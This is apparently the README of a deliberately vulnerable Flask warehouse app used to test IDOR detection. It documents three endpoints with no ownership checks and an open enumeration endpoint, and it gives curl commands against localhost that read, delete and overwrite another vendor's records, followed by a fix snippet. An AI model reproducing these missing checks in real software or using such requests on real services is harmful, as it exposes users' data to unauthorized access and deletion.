# IDOR Warehouse — Challenge App

A deliberately vulnerable Flask app for testing IDOR (Insecure Direct Object Reference) detection.
Auth is simulated via the `X-Vendor-ID` request header — no real authentication is enforced.

## Warehouse Codes

| Code  | Owner    | Name           |
|-------|----------|----------------|
| RYWYO | vendor-a | Main Warehouse |
| ABCDE | vendor-b | East Warehouse |
| XYZPQ | vendor-c | West Warehouse |

## The 3 IDOR Challenges

### Challenge 1 — GET /warehouses/<code>
Any vendor can read any warehouse record. The handler reads `X-Vendor-ID` but never compares it
to `wh["owner"]`, so `vendor-a` can freely fetch ABCDE or XYZPQ.

```bash
curl -H "X-Vendor-ID: vendor-a" http://localhost:5000/warehouses/ABCDE
# Returns vendor-b's warehouse — IDOR confirmed
```

### Challenge 2 — DELETE /warehouses/<code>
Any vendor can delete any warehouse. No ownership check before `del WAREHOUSES[code]`.

```bash
curl -X DELETE -H "X-Vendor-ID: vendor-a" http://localhost:5000/warehouses/ABCDE
# Deletes vendor-b's warehouse — IDOR confirmed
```

### Challenge 3 — PUT /warehouses/<code>
Any vendor can overwrite any warehouse's fields. No ownership check before `wh.update(data)`.

```bash
curl -X PUT -H "X-Vendor-ID: vendor-a" \
     -H "Content-Type: application/json" \
     -d '{"name": "Hijacked"}' \
     http://localhost:5000/warehouses/ABCDE
# Mutates vendor-b's warehouse — IDOR confirmed
```

## Running Locally

```bash
docker build -t idor-warehouse .
docker run -p 5000:5000 idor-warehouse
```

Or without Docker:

```bash
pip install flask
python app.py
```

## Enumeration Endpoint

`GET /warehouses` lists all warehouse codes — intentionally unauthenticated to support enumeration
as the first step in an IDOR probe chain.

## Secure Fix (what the fix should look like)

Each mutating/reading handler should add an ownership guard before proceeding:

```python
if wh["owner"] != vendor_id:
    return jsonify({"error": "forbidden"}), 403
```
